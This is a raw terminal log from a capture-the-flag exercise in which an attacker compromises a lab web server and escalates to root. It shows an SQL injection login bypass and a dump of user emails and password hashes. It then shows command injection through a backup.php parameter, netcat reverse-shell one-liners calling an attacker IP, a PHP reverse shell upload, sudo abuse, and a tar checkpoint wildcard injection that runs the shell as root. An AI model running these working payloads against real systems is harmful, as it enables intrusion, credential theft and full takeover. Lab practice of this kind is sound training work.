
➜  zSecurity_Client_CTF gobuster dir -u http://10.10.34.138 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 

admin'or'1'='1

Sno. 	First Name 	Last Name 	Email Id 	Contact no. 	Password
1 	afsar 	as 	afsar.sdq@gmail.com 	123 	81dc9bdb52d04dc20036dbd8313ed055 	
2 	Afsar 	siddiqui 	afsar.sdq@gmail.com 	8090648046 	3677b23baa08f74c28aba07f0cb6554e


10.10.34.138/client/admin/backup.php?cmd=cp%20-r%20/

sudo tcpdump ip proto \\icmp -i tun0

10.10.34.138/client/admin/backup.php?cmd=ping 10.8.5.88 -c 3
original
echo "mkfifo /tmp/lhennp; nc 192.168.1.102 8888 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh

form msfvenom
mkfifo /tmp/ceeie; nc 10.8.5.88 8888 0</tmp/ceeie | /bin/sh >/tmp/ceeie 2>&1; rm /tmp/ceeie
echo "mkfifo /tmp/ceeie; nc 10.8.5.88 8888 0</tmp/ceeie | /bin/sh >/tmp/ceeie 2>&1; rm /tmp/ceeie" > shell.sh

➜  zSecurity_Client_CTF msfvenom -p cmd/unix/reverse_netcat lhost=10.8.5.88 lport=8888 R
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 91 bytes
mkfifo /tmp/ceeie; nc 10.8.5.88 8888 0</tmp/ceeie | /bin/sh >/tmp/ceeie 2>&1; rm /tmp/ceeie
# ROOT_flag
~~~
➜  zSecurity_Client_CTF nc -lvnp 8888
listening on [any] 8888 ...
connect to [10.8.5.88] from (UNKNOWN) [10.10.34.138] 43196
id
uid=0(root) gid=0(root) groups=0(root)
s  
/bin/sh: 2: s: not found
cd /home
ls
julian
cd ..
cd /root
ls
readme.txt
root-flag.txt
cat *.txt


                --------------------------------------------------------------------

                I've never found it hard to hack most people. If you listen to them,
                watch them, their vulnerabilities are like a neon sign screwed into 
                                        theirs heads...

                Elliot Alderson
                --------------------------------------------------------------------
flag{cR0nJoBs_aR3_Th3_b3ST_F0r_pR!VesC}
~~~
 headers)
[ERROR] Get "http://10.10.34.138/rss": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
/assets               (Status: 301) [Size: 313] [--> http://10.10.34.138/assets/]
/client               (Status: 301) [Size: 313] [--> http://10.10.34.138/client/]
/vendor               (Status: 301) [Size: 313] [--> http://10.10.34.138/vendor/]
Progress: 54290 / 220561 (24.61%)^Z
[1]  + 431239 suspended  gobuster dir -u http://10.10.34.138 -w 
➜  zSecurity_Client_CTF locate php reverse shell
/home/alpha/alpha-academy/holo/External-Penetration-Testing-Holo-Corporate-Network-TryHackMe-Holo-Network/img/reverse-shell-php.png
/home/alpha/alpha-academy/holo/External-Penetration-Testing-Holo-Corporate-Network-TryHackMe-Holo-Network/img/upload-reverse-shell-php.png
/home/alpha/ctf/BankCTF/php-reverse-shell.php
/home/alpha/ctf/DAv/php-reverse-shell.php
/home/alpha/ctf/academy/php-reverse-shell.php
/home/alpha/ctf/colddbox/php-reverse-shell.php
/home/alpha/ctf/convertmyvideo/php-reverse-shell.php
/home/alpha/ctf/mr-robot/php-reverse-shell.php
/home/alpha/ctf/mr-robot/vm/php-reverse-shell-1.0
/home/alpha/ctf/mr-robot/vm/php-reverse-shell-1.0.tar.gz
/home/alpha/ctf/mr-robot/vm/php-reverse-shell-1.0/CHANGELOG
/home/alpha/ctf/mr-robot/vm/php-reverse-shell-1.0/COPYING.GPL
/home/alpha/ctf/mr-robot/vm/php-reverse-shell-1.0/COPYING.PHP-REVERSE-SHELL
/home/alpha/ctf/mr-robot/vm/php-reverse-shell-1.0/hash.txt
/home/alpha/ctf/mr-robot/vm/php-reverse-shell-1.0/password.raw-md5
/home/alpha/ctf/mr-robot/vm/php-reverse-shell-1.0/php-reverse-shell.php
/home/alpha/ctf/mr-robot/vm/php-reverse-shell-1.0/php-reverse-shell.php.zip
/home/alpha/cybergirl/What-the-Shell?/php-reverse-shell.php
/home/alpha/vulnhub/pwnlab/php-reverse-shell.php
/home/alpha/vulnhub/stapler/php-reverse-shell.php
/usr/share/laudanum/php/php-reverse-shell.php
/usr/share/laudanum/wordpress/templates/php-reverse-shell.php
/usr/share/webshells/php/php-reverse-shell.php
➜  zSecurity_Client_CTF cp /usr/share/webshells/php/php-reverse-shell.php .
➜  zSecurity_Client_CTF ls
README.md  php-reverse-shell.php
➜  zSecurity_Client_CTF subl php-reverse-shell.php 
➜  zSecurity_Client_CTF mv php-reverse-shell.php shell.php
➜  zSecurity_Client_CTF nc -nvlp 4444
retrying local 0.0.0.0:4444 : Address already in use
retrying local 0.0.0.0:4444 : Address already in use
^Z
[2]  + 442753 suspended  nc -nvlp 4444
➜  zSecurity_Client_CTF nc -nvlp 4444
retrying local 0.0.0.0:4444 : Address already in use
retrying local 0.0.0.0:4444 : Address already in use
^C
➜  zSecurity_Client_CTF subl shell.php 
➜  zSecurity_Client_CTF nc -nvlp 4443                   
listening on [any] 4443 ...
^C
➜  zSecurity_Client_CTF mv shell.php rev.php
➜  zSecurity_Client_CTF nc -nvlp 4443       
listening on [any] 4443 ...
^C
➜  zSecurity_Client_CTF nc -lvnp 4443
listening on [any] 4443 ...
^C
➜  zSecurity_Client_CTF subl rev.php        
➜  zSecurity_Client_CTF nc -lvnp 4443
listening on [any] 4443 ...
connect to [10.8.5.88] from (UNKNOWN) [10.10.34.138] 34486
Linux client-ctf 4.15.0-147-generic #151-Ubuntu SMP Fri Jun 18 19:21:19 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 18:45:01 up 42 min,  0 users,  load average: 0.00, 0.00, 0.08
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ ls
bin
boot
cdrom
dev
etc
home
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
swap.img
sys
tmp
usr
var
vmlinuz
vmlinuz.old
$ cd home
$ ls
julian
$ cd julian
l$ ls
/bin/sh: 5: lls: not found
$ cd ..
$ pwd
/home
$ sudo -l
Matching Defaults entries for www-data on client-ctf:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on client-ctf:
    (julian) NOPASSWD: /bin/ash
$ sudo ash
sudo: no tty present and no askpass program specified
$ cd ..
$ ./ash
/bin/sh: 11: ./ash: not found
$ sudo ash
sudo: no tty present and no askpass program specified
$ which python 
$ which python3
/usr/bin/python3
$ python3 -c 'import pty;pty.spawn("/bin/bash")
> 
> 
> kjsdsd
> ^C
➜  zSecurity_Client_CTF nc -lvnp 4443
listening on [any] 4443 ...
connect to [10.8.5.88] from (UNKNOWN) [10.10.34.138] 34488
Linux client-ctf 4.15.0-147-generic #151-Ubuntu SMP Fri Jun 18 19:21:19 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 18:50:25 up 47 min,  0 users,  load average: 0.00, 0.00, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ which python3
/usr/bin/python3
$ python3 -c 'import pty;pty.spawn("/bin/bash")
> ^Z
[3]  + 450621 suspended  nc -lvnp 4443
➜  zSecurity_Client_CTF nc -lvnp 4443
listening on [any] 4443 ...
connect to [10.8.5.88] from (UNKNOWN) [10.10.34.138] 34490
Linux client-ctf 4.15.0-147-generic #151-Ubuntu SMP Fri Jun 18 19:21:19 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 18:51:01 up 48 min,  0 users,  load average: 0.00, 0.00, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@client-ctf:/$ cd
cd
bash: cd: HOME not set
www-data@client-ctf:/$ export TERM=xterm
export TERM=xterm
www-data@client-ctf:/$ sudo -l       
sudo -l
Matching Defaults entries for www-data on client-ctf:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on client-ctf:
    (julian) NOPASSWD: /bin/ash
www-data@client-ctf:/$ sudo -u julian /bin/ash
sudo -u julian /bin/ash
$ id
id
uid=1000(julian) gid=1000(julian) groups=1000(julian),4(adm),24(cdrom),30(dip),46(plugdev)
$ which python3
which python3
/usr/bin/python3
$ python3 -c 'import pty;pty.spawn ("/bin/bash")'
python3 -c 'import pty;pty.spawn ("/bin/bash")'
julian@client-ctf:/$ ls
ls
bin    dev   initrd.img      lib64       mnt   root  snap      sys  var
boot   etc   initrd.img.old  lost+found  opt   run   srv       tmp  vmlinuz
cdrom  home  lib             media       proc  sbin  swap.img  usr  vmlinuz.old
julian@client-ctf:/$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root /usr/local/bin/compress.sh
julian@client-ctf:/$ ls 
ls
bin    dev   initrd.img      lib64       mnt   root  snap      sys  var
boot   etc   initrd.img.old  lost+found  opt   run   srv       tmp  vmlinuz
cdrom  home  lib             media       proc  sbin  swap.img  usr  vmlinuz.old
julian@client-ctf:/$ cd /home
cd /home
julian@client-ctf:/home$ ls
ls
julian
julian@client-ctf:/cd julian                                 
cd julian
julian@client-ctf:~$ echo "mkfifo /tmp/ceeie; nc 10.8.5.88 8888 0</tmp/ceeie | /bin/sh >/tmp/ceeie 2>&1; rm /tmp/ceeie" > shell.sh
bin/sh >/tmp/ceeie 2>&1; rm /tmp/ceeie" > shell.shceeie | /b
julian@client-ctf:~$ ls
ls
shell.sh
julian@client-ctf:~$ echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > "--checkpoint-action=exec=sh shell.sh"
julian@client-ctf:~$ echo "" > --checkpoint=1
echo "" > --checkpoint=1
julian@client-ctf:~$ echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > "--checkpoint-action=exec=sh shell.sh"
julian@client-ctf:~$ echo "" > --checkpoint=1
echo "" > --checkpoint=1
julian@client-ctf:~$ echo "mkfifo /tmp/ceeie; nc 10.8.5.88 8888 0</tmp/ceeie | /bin/sh >/tmp/ceeie 2>&1; rm /tmp/ceeie" > shell.sh
bin/sh >/tmp/ceeie 2>&1; rm /tmp/ceeie" > shell.shceeie | /becho "mkfifo /tmp/ceeie; nc 10.8.5.88 8888 0</tmp/ceeie | /b
julian@client-ctf:~$